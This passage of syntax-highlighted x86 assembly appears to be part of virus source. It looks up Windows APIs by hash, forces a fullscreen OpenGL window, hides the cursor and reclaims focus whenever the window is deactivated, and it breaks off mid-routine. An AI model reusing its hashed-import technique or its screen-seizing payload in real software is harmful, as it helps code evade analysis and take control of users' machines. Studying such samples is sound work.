</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc2">0D48A96AAh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; RegisterClassA</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc1">;int        3</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">148</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     

</span><span class="sc6">repz</span><span class="sc0">        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">148</span><span class="sc0">  </span><span class="sc1">; dmSize</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">104</span><span class="sc4">],</span><span class="sc2">16</span><span class="sc0">      </span><span class="sc1">; dmBitsPerPel</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">108</span><span class="sc4">],</span><span class="sc2">640</span><span class="sc0">     </span><span class="sc1">; dmWidth</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">112</span><span class="sc4">],</span><span class="sc2">480</span><span class="sc0">     </span><span class="sc1">; dmHeight</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc2">1C0000h</span><span class="sc0">  </span><span class="sc1">; set dmFields = </span><span class="sc0">
            </span><span class="sc1">; DM_BITSPERPEL | DM_PELSWIDTH | DM_PELSHEIGHT</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; CDS_FULLSCREEN</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; dmScreenSettings</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc2">56C779B2h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; ChangeDisplaySettingsA</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">148</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc2">7F2EA568h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; ShowCursor</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'LGO'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">480</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">640</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">90020000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0400000h</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc2">7099FB9Ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">;   CreateWindowExA</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">44</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc5">DoMLoop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc2">3BAC79F3h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; GetMessageA</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dontfixit</span><span class="sc0">

</span><span class="sc5">dontfixit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finishMLoop</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc2">50D9920Ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; TranslateMessage</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc2">5BFFA45Ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; DispatchMessageA</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoMLoop</span><span class="sc0">

</span><span class="sc5">finishMLoop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc1">;push       0</span><span class="sc0">
</span><span class="sc1">;call       ExitProcess</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; Thread return</span><span class="sc0">

</span><span class="sc5">WindowProc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">lpamval</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">wpamval</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">umsgval</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">hwndval</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">],</span><span class="sc2">86h</span><span class="sc0">         </span><span class="sc1">; WM_NCACTIVE</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">gogoawayme</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">],</span><span class="sc2">6h</span><span class="sc0">          </span><span class="sc1">; WM_ACTIVATE</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipcreat</span><span class="sc0">

</span><span class="sc1">; Cecile, three week passed, I'm crying the news I don't have, I'm crying</span><span class="sc0">
</span><span class="sc1">; the love I don't have, I'm crying the passion u don't have, Cecile, you</span><span class="sc0">
</span><span class="sc1">; are so far I don't want anything much from your part...</span><span class="sc0">

</span><span class="sc5">gogoawayme</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">0A74E296Ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; SetForegroundWindow</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">619AD6D8h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; SetFocus</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">0CC447A6Eh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; SetActiveWindow</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">skipcreat</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;cmp    dword ptr [esp+umsgval],10h         ; WM_CLOSE</span><span class="sc0">
</span><span class="sc1">;jne    skipQuitting</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;quitting:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;push   0</span><span class="sc0">
</span><span class="sc1">;call   PostQuitMessage</span><span class="sc0">
</span><span class="sc1">;xor    eax,eax</span><span class="sc0">
</span><span class="sc1">;ret    16</span><span class="sc0">

</span><span class="sc5">skipQuitting</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SkipCreating</span><span class="sc0">

</span><span class="sc1">;int    3</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">002ACB18h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">k282</span><span class="sc0">                </span><span class="sc1">; GetDC</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                 </span><span class="sc1">; Create the pixel format</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; descriptor</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">40</span><span class="sc0">           </span><span class="sc1">; fill open gl size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; fill the version</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">37</span><span class="sc0">            </span><span class="sc1">; support opengl + draw window</span><span class="sc0">
                        </span><span class="sc1">; + double buff</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc2">16</span><span class="sc0">         </span><span class="sc1">; Color bit</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">17</span><span class="sc4">],</span><span class="sc2">16</span><span class="sc0">            </span><span class="sc1">; Depth bit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; ecx = *pfd</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; eax = the DC</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">7667726Eh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">         </span><span class="sc1">; ChoosePixelFormat     </span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; ebx = DC</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; ecx = *pfd</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">fixstackandExit</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; eax = pixelformat</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">073D91C5Eh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc5">k321</span><span class="sc0">       </span><span class="sc1">; SetPixelFormat</span><span class="sc0">
                    </span><span class="sc1">; we setted pixel format :)</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">fixstackandExit</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">4FE0E526h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k329</span><span class="sc0">    </span><span class="sc1">; wglCreateContext</span><span class="sc0">
                    </span><span class="sc1">; setting open gl context</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> 
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">fixstackandExit</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">07772016h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k337</span><span class="sc0">        </span><span class="sc1">; wglMakeCurrent</span><span class="sc0">
                    </span><span class="sc1">; set our open gl context</span><span class="sc0">
</span><span class="sc1">;push   0BE2h</span><span class="sc0">
</span><span class="sc1">;call   glEnable            ; enable blending</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0B57h</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">075D1F228h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k343</span><span class="sc0">   </span><span class="sc1">; glEnable</span><span class="sc0">
                    </span><span class="sc1">; enable material coloration</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0B50h</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">075D1F228h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k346</span><span class="sc0">   </span><span class="sc1">; glEnable</span><span class="sc0">
                    </span><span class="sc1">; enable ligthing</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4000h</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">075D1F228h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k349</span><span class="sc0">   </span><span class="sc1">; glEnable</span><span class="sc0">
                    </span><span class="sc1">; enable light 1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">fixstackandExit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">07818C6Bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; PostQuitMessage</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">SkipCreating</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">         </span><span class="sc1">; WM_SIZE</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipResizing</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lpamval</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
